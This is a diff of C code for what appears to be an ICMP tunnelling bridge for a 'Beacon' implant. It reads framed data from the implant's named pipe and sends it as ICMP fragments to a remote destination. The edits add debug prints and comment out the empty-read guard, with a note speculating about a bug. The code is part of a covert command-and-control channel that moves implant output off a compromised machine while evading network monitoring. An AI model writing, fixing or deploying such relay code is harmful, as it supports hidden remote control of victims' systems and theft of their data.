@@ -115,6 +115,7 @@ int received_map[1000]; // track received fragments (max 1000)
 
 // Reads a “frame” from the given HANDLE by first reading a 4‐byte length, then that many bytes.
 DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
+    printf("[+] Reading Frame\n");
 	DWORD size = 0, temp = 0, total = 0;
 
 	/* read the 4-byte length */
@@ -131,6 +132,7 @@ DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
 
 // Writes a “frame” to the given HANDLE by first writing a 4‐byte length, then the data.
 void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
+    printf("[+] Writing Frame\n");
 	DWORD wrote = 0;
 	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
 	WriteFile(my_handle, buffer, length, &wrote, NULL);
@@ -634,14 +636,27 @@ int bridge_to_beacon() {
     while (TRUE) {
         // 1) Read any data the Beacon has written into the named pipe.
         //    read_frame returns the number of bytes read, or 0 if no data.
+
+        //I think the problem is that the pipe has no data, and as such bugs out the logic
         DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
 
         int total_len = (int)beacon_output;
-        if (total_len <= 0) {
-            // no data to send, skip ICMP entirely
-            Sleep(SLEEP_TIME);
-            continue;
-        }
+        // if (total_len <= 0) {
+        //     printf("Waiting for data to pipe...");
+        //     // no data to send, skip ICMP entirely
+        //     Sleep(SLEEP_TIME);
+        //     continue;
+        // }
+
+        // DWORD bytes_avail = 0;
+        // PeekNamedPipe(handle_beacon, NULL, 0, NULL, &bytes_avail, NULL);
+        // if (bytes_avail < 4) {
+        //     // Not enough to even read the 4-byte length header—sleep and continue
+        //     Sleep(SLEEP_TIME);
+        //     continue;
+        // }
+        // Now it’s safe to call read_frame().
+        // DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
 
         send_icmp_fragments(s, &dest, pipe_buffer, total_len);
 
